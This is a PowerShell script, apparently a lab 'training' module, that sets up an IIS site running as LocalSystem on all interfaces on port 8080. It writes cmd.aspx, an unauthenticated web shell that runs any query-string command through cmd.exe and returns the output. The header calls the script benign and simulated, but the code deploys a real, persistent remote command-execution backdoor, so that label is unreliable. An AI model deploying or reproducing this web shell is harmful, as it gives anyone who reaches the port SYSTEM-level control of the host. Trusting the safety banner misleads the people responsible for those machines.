<#
BENIGN TRAINING SCRIPT - Project Raptor (Module 01)
Purpose: Provision a safe, simulated IIS-hosted ASPX command endpoint for defender telemetry training.
Safety: No exploit delivery, no persistence, no external C2, no destructive actions.
Idempotent: Safe to run repeatedly.
#>

[CmdletBinding()]
param(
    [string]$SiteName = "ShellSite",
    [string]$AppPoolName = "ShellPool",
    [string]$PhysicalPath = "C:\inetpub\shell",
    [int]$Port = 8080,
    [switch]$SkipIisReset
)

$ErrorActionPreference = "Stop"

function Require-Admin {
    $id = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($id)
    if (-not $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
        throw "Run this script in an elevated PowerShell session (Administrator)."
    }
}

Require-Admin
Import-Module WebAdministration

Write-Host "[1/6] Ensuring web root: $PhysicalPath"
New-Item -ItemType Directory -Path $PhysicalPath -Force | Out-Null

Write-Host "[2/6] Ensuring app pool: $AppPoolName"
if (-not (Test-Path "IIS:\AppPools\$AppPoolName")) {
    New-WebAppPool -Name $AppPoolName | Out-Null
}
Set-ItemProperty "IIS:\AppPools\$AppPoolName" -Name managedRuntimeVersion -Value "v4.0"
Set-ItemProperty "IIS:\AppPools\$AppPoolName" -Name processModel.identityType -Value 0  # LocalSystem (lab-only)
Set-ItemProperty "IIS:\AppPools\$AppPoolName" -Name startMode -Value "AlwaysRunning"

Write-Host "[3/6] Ensuring site: $SiteName on port $Port"
if (-not (Test-Path "IIS:\Sites\$SiteName")) {
    New-Website -Name $SiteName -Port $Port -PhysicalPath $PhysicalPath -ApplicationPool $AppPoolName | Out-Null
} else {
    Set-ItemProperty "IIS:\Sites\$SiteName" -Name physicalPath -Value $PhysicalPath

    $hasHttpBinding = (Get-WebBinding -Name $SiteName -Protocol "http" | Where-Object { $_.bindingInformation -eq "*:$Port:" })
    if (-not $hasHttpBinding) {
        New-WebBinding -Name $SiteName -Protocol "http" -Port $Port -IPAddress "*" | Out-Null
    }

    Set-ItemProperty "IIS:\Sites\$SiteName" -Name applicationDefaults.applicationPool -Value $AppPoolName
}

Write-Host "[4/6] Writing minimal web.config + cmd.aspx"
@'
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.web>
    <compilation debug="true" targetFramework="4.0" />
    <httpRuntime targetFramework="4.0" />
  </system.web>
</configuration>
'@ | Set-Content -Path (Join-Path $PhysicalPath "web.config") -Encoding UTF8

@'
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
string cmd = Request.QueryString["cmd"];
if (string.IsNullOrEmpty(cmd)) { Response.Write("no cmd"); return; }
Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.Arguments = "/c " + cmd;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardError = true;
p.StartInfo.CreateNoWindow = true;
p.Start();
Response.ContentType = "text/plain";
Response.Write(p.StandardOutput.ReadToEnd());
Response.Write(p.StandardError.ReadToEnd());
%>
'@ | Set-Content -Path (Join-Path $PhysicalPath "cmd.aspx") -Encoding UTF8

Write-Host "[5/6] Applying directory ACLs for IIS worker identities"
icacls $PhysicalPath /grant "IIS_IUSRS:(OI)(CI)(RX)" /T | Out-Null
icacls $PhysicalPath /grant "IUSR:(OI)(CI)(RX)" /T | Out-Null

Write-Host "[6/6] Starting site + validation"
Start-Website -Name $SiteName
if (-not $SkipIisReset) { iisreset | Out-Null }

$listen = Get-NetTCPConnection -State Listen -LocalPort $Port -ErrorAction SilentlyContinue
if (-not $listen) {
    throw "Validation failed: no listener on port $Port"
}

$tnc = Test-NetConnection -ComputerName localhost -Port $Port -WarningAction SilentlyContinue
if (-not $tnc.TcpTestSucceeded) {
    throw "Validation failed: localhost:$Port is not reachable"
}

Write-Host "SUCCESS: $SiteName listening on http://localhost:$Port/"
Write-Host "Quick test: curl.exe \"http://localhost:$Port/cmd.aspx?cmd=whoami\""
